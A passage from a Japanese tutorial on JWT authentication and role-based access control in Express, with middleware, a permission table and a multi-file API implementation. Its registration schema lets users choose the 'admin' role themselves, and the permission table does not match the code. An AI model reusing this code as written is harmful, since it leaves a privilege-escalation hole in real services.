      return res.status(403).json({ error: { message: '不明なロールです' } })
    }

    const hasPermission = requiredPermissions.every((permission) =>
      userRole.permissions.includes(permission)
    )

    if (!hasPermission) {
      return res.status(403).json({
        error: {
          message: 'この操作を行う権限がありません',
          required: requiredPermissions,
          userRole: req.user.role,
        },
      })
    }

    next()
  }
}

// 使用例
// 投稿の作成: user以上
app.post('/api/posts', authenticate, requirePermission('post:create'), (req, res) => {
  res.status(201).json({ message: '投稿を作成しました' })
})

// 投稿の削除: moderator以上
app.delete('/api/posts/:id', authenticate, requirePermission('post:delete'), (req, res) => {
  res.json({ message: '投稿を削除しました' })
})

// 管理者画面: admin のみ
app.get('/api/admin/dashboard', authenticate, requirePermission('admin:access'), (req, res) => {
  res.json({ message: '管理者ダッシュボード' })
})
```

### ロール一覧表

| 権限           | guest | user | moderator | admin |
| -------------- | ----- | ---- | --------- | ----- |
| post:read      | o     | o    | o         | o     |
| post:create    | -     | o    | -         | o     |
| post:update    | -     | -    | o         | o     |
| post:delete    | -     | -    | o         | o     |
| comment:read   | o     | o    | o         | o     |
| comment:create | -     | o    | o         | o     |
| comment:update | -     | -    | o         | o     |
| comment:delete | -     | -    | o         | o     |
| user:read      | -     | o    | o         | o     |
| user:create    | -     | -    | -         | o     |
| user:update    | -     | -    | -         | o     |
| user:delete    | -     | -    | -         | o     |
| admin:access   | -     | -    | -         | o     |

## 実践例: 認証付きREST APIの全実装

以下は、ここまで学んだ全ての概念を組み合わせた実践的な認証付きAPIの完全な実装。

### ディレクトリ構成

```
auth-api/
├── .env
├── package.json
├── app.js              ← エントリーポイント
├── config/
│   └── index.js        ← 設定値の管理
├── middleware/
│   ├── auth.js         ← 認証ミドルウェア
│   ├── rbac.js         ← 認可ミドルウェア
│   ├── validate.js     ← バリデーションミドルウェア
│   └── errorHandler.js ← エラーハンドリング
├── routes/
│   ├── auth.js         ← 認証ルート
│   ├── users.js        ← ユーザーCRUD
│   └── posts.js        ← 投稿CRUD
├── schemas/
│   └── index.js        ← zodスキーマ定義
└── utils/
    └── token.js        ← トークン生成ユーティリティ
```

### 各ファイルの実装

```javascript
// config/index.js
require('dotenv').config()

module.exports = {
  port: process.env.PORT || 3000,
  jwtSecret: process.env.JWT_SECRET,
  jwtExpiresIn: process.env.JWT_EXPIRES_IN || '1h',
  jwtRefreshSecret: process.env.JWT_REFRESH_SECRET,
  jwtRefreshExpiresIn: process.env.JWT_REFRESH_EXPIRES_IN || '7d',
}
```

```javascript
// utils/token.js
const jwt = require('jsonwebtoken')
const config = require('../config')

function generateAccessToken(user) {
  return jwt.sign({ userId: user.id, email: user.email, role: user.role }, config.jwtSecret, {
    expiresIn: config.jwtExpiresIn,
  })
}

function generateRefreshToken(user) {
  return jwt.sign({ userId: user.id }, config.jwtRefreshSecret, {
    expiresIn: config.jwtRefreshExpiresIn,
  })
}

function verifyAccessToken(token) {
  return jwt.verify(token, config.jwtSecret, { algorithms: ['HS256'] })
}

function verifyRefreshToken(token) {
  return jwt.verify(token, config.jwtRefreshSecret, { algorithms: ['HS256'] })
}

module.exports = {
  generateAccessToken,
  generateRefreshToken,
  verifyAccessToken,
  verifyRefreshToken,
}
```

```javascript
// middleware/auth.js
const { verifyAccessToken } = require('../utils/token')

function authenticate(req, res, next) {
  const authHeader = req.headers.authorization
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res
      .status(401)
      .json({ error: { code: 'UNAUTHENTICATED', message: '認証トークンが必要です' } })
  }

  const token = authHeader.split(' ')[1]
  try {
    req.user = verifyAccessToken(token)
    next()
  } catch (err) {
    const message =
      err.name === 'TokenExpiredError' ? 'トークンの有効期限が切れています' : '無効なトークンです'
    const code = err.name === 'TokenExpiredError' ? 'TOKEN_EXPIRED' : 'INVALID_TOKEN'
    return res.status(401).json({ error: { code, message } })
  }
}

module.exports = { authenticate }
```

```javascript
// middleware/rbac.js
const ROLES = {
  admin: [
    'user:read',
    'user:create',
    'user:update',
    'user:delete',
    'post:read',
    'post:create',
    'post:update',
    'post:delete',
    'admin:access',
  ],
  moderator: ['user:read', 'post:read', 'post:update', 'post:delete'],
  user: ['user:read', 'post:read', 'post:create'],
}

function requirePermission(...permissions) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: { message: '認証が必要です' } })
    }
    const userPermissions = ROLES[req.user.role] || []
    const hasPermission = permissions.every((p) => userPermissions.includes(p))
    if (!hasPermission) {
      return res
        .status(403)
        .json({ error: { code: 'FORBIDDEN', message: 'この操作を行う権限がありません' } })
    }
    next()
  }
}

module.exports = { requirePermission, ROLES }
```

```javascript
// middleware/errorHandler.js
function errorHandler(err, req, res, next) {
  console.error(`[ERROR] ${err.message}`)
  const statusCode = err.statusCode || 500
  const response = {
    error: {
      code: err.code || 'INTERNAL_ERROR',
      message: statusCode === 500 ? 'サーバー内部エラーが発生しました' : err.message,
    },
  }
  if (err.details) response.error.details = err.details
  if (process.env.NODE_ENV === 'development' && statusCode === 500) {
    response.error.stack = err.stack
  }
  res.status(statusCode).json(response)
}

module.exports = { errorHandler }
```

```javascript
// middleware/validate.js
function validate(schema) {
  return (req, res, next) => {
    const result = schema.safeParse(req.body)
    if (!result.success) {
      return res.status(400).json({
        error: {
          code: 'VALIDATION_ERROR',
          message: '入力値が不正です',
          details: result.error.errors.map((e) => ({
            field: e.path.join('.'),
            message: e.message,
          })),
        },
      })
    }
    req.validatedBody = result.data
    next()
  }
}

module.exports = { validate }
```

```javascript
// schemas/index.js
const { z } = require('zod')

const registerSchema = z.object({
  name: z.string().min(2, '名前は2文字以上です').max(50),
  email: z.string().email('有効なメールアドレスを入力してください'),
  password: z.string().min(8, 'パスワードは8文字以上です'),
  role: z.enum(['user', 'moderator', 'admin']).default('user'),
})

const loginSchema = z.object({
  email: z.string().email('有効なメールアドレスを入力してください'),
  password: z.string().min(1, 'パスワードは必須です'),
})

const createPostSchema = z.object({
  title: z.string().min(1).max(200),
  body: z.string().min(1),
  tags: z.array(z.string()).default([]),
})

module.exports = { registerSchema, loginSchema, createPostSchema }
```

```javascript
// app.js
require('dotenv').config()
const express = require('express')
const cors = require('cors')
const rateLimit = require('express-rate-limit')
const config = require('./config')
const authRoutes = require('./routes/auth')
const userRoutes = require('./routes/users')
const postRoutes = require('./routes/posts')
const { errorHandler } = require('./middleware/errorHandler')

const app = express()

// グローバルミドルウェア
app.use(express.json())
app.use(cors())
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }))

// ルート
app.use('/api/auth', authRoutes)
app.use('/api/users', userRoutes)
app.use('/api/posts', postRoutes)

// 404
app.use((req, res) => {
  res.status(404).json({ error: { code: 'NOT_FOUND', message: 'エンドポイントが見つかりません' } })
})

// エラーハンドリング
app.use(errorHandler)

app.listen(config.port, () => {
  console.log(`認証付きAPIサーバーが http://localhost:${config.port} で起動しました`)
})
```

このようにファイルを分割することで、各ファイルが一つの責務を持ち、見通しの良いコードになる。実務のプロジェクトでは、さらにデータベース層（Repository/Model）や、サービス層（ビジネスロジック）を追加する構成が一般的。

## まとめ

認証に関して押さえるべきポイントを整理する。

| カテゴリ     | ポイント                                                              |
| ------------ | --------------------------------------------------------------------- |
| 基礎概念     | Authentication（誰か確認）とAuthorization（何を許可するか）の違い     |
| JWT          | 3つの構成要素（Header, Payload, Signature）、署名の仕組み             |
| トークン管理 | アクセストークン（短期）+ リフレッシュトークン（長期）の2トークン方式 |
| 保存場所     | アクセストークンはメモリ、リフレッシュトークンはhttpOnly Cookie       |
| パスワード   | bcryptでハッシュ化、平文保存は厳禁                                    |
| セキュリティ | XSS/CSRF対策、HTTPS必須、秘密鍵の管理                                 |
| 認可         | RBACでロールに応じたアクセス制御                                      |
| OAuth        | パスワードを渡さず第三者にアクセスを許可する仕組み                    |

認証の実装はセキュリティに直結するため、本番環境では必ず以下を確認すること:

- 秘密鍵は十分に長くランダムか
- HTTPSを使用しているか
- パスワードはハッシュ化されているか
- トークンの有効期限は適切か
- エラーメッセージからユーザー情報が漏れていないか

## 参考リンク

- [JWT公式サイト（jwt.io）](https://jwt.io/) - JWTのデバッグツール、ライブラリ一覧
- [RFC 7519 - JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519) - JWTの公式仕様（英語）
- [jsonwebtoken npmパッケージ](https://github.com/auth0/node-jsonwebtoken) - Node.jsのJWTライブラリ
- [bcryptjs npmパッケージ](https://github.com/dcodeIO/bcrypt.js) - パスワードハッシュ化ライブラリ
- [OAuth 2.0 - RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749) - OAuth 2.0の公式仕様（英語）
- [OWASP認証チートシート](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) - 認証のセキュリティベストプラクティス（英語）
- [Auth0ブログ](https://auth0.com/blog/) - 認証に関する技術記事（英語）
- [MDN Web Docs - HTTP認証](https://developer.mozilla.org/ja/docs/Web/HTTP/Authentication) - HTTP認証の基礎
- [GitHub OAuth Apps](https://docs.github.com/ja/apps/oauth-apps) - GitHub OAuth Appsのドキュメント
- [zod公式ドキュメント](https://zod.dev/) - バリデーションライブラリ
